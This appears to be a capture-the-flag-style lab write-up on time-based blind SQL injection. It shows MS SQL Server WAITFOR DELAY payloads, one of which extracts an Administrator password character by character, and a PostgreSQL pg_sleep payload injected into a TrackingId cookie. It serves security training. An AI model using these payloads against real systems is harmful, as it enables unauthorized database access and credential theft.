## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/235321557-05e2a6b3-b436-45af-ad3e-02bdedd91916.png)

## Overview :

 it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true: 

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

 The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time: 

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
## Solution :

#### Cause a 10 sec delay in response -

The request looks like this 

![image](https://user-images.githubusercontent.com/67383098/235321733-35745ef4-f902-4397-bdc3-baa45a1b4a8d.png)

SLEEP command differs for each type of databse, here we find it by trial & error method that it is a *POSTgreSQL database*

![image](https://user-images.githubusercontent.com/67383098/235321833-a09fa828-8d67-4084-9c2e-5fec2c239f95.png)


To do this we can use the following payload 

```sql
TrackingId=x'||pg_sleep(10)--
```

![image](https://user-images.githubusercontent.com/67383098/235321757-89cd61bd-2855-4389-af32-6ec22ca24d85.png)

We get a response after 10 sec which confirms the SQL injection vulnerability.


![image](https://user-images.githubusercontent.com/67383098/235321954-4b95899e-90f0-4ae0-9fc8-97f6f5113c55.png)























